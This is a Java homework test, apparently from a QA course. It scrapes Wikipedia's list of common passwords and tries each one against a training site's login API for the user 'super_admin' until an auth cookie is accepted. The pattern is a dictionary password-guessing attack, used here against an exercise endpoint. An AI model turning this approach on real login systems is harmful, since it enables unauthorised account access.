package Homeworks;

import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class Ex9 {


    public List<WebElement> passwordList = new ArrayList<>();
    public List<String> cookiesList = new ArrayList<>();
    public String login = "super_admin";

    public static final String PASSWORD_LIST_LOCATOR = ".//table[contains(caption, 'to SplashData')]" + "//td[@align='left']";


    @Test
    public void testCheckAuthCookie() {
        findPasswordList();
        for (int i = 0; i < passwordList.size(); i++) {

            Map<String, Object> body = new HashMap<>();
            body.put("login", login);
            body.put("password", passwordList.get(i).getText());

            Response responseCookie = RestAssured
                    .given()
                    .body(body)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();
            cookiesList.add(responseCookie.detailedCookies().getValue("auth_cookie"));
        }

        for (int j = 1; j < cookiesList.size(); j++) {
            Response responseAnswer = RestAssured
                    .given()
                    .cookies("auth_cookie",cookiesList.get(j))
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();
            String answer = responseAnswer.body().asString();

            if (!answer.equals("You are NOT authorized")) {
                System.out.println("Правильный пароль:" + passwordList.get(j).getText());
                System.out.println("Сообщение:" + answer);
            }
        }
    }

    public void findPasswordList(){
        WebDriver driver = new ChromeDriver();
        driver.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords");
        passwordList = driver.findElements(By.xpath(PASSWORD_LIST_LOCATOR));

        for (int i = 0; i < passwordList.size(); i++){
            for (int j = passwordList.size() - 1; j > i; j--){
                if (passwordList.get(j).getText().equals(passwordList.get(i).getText())){
                    passwordList.remove(j);
                }
            }
        }
    }




}
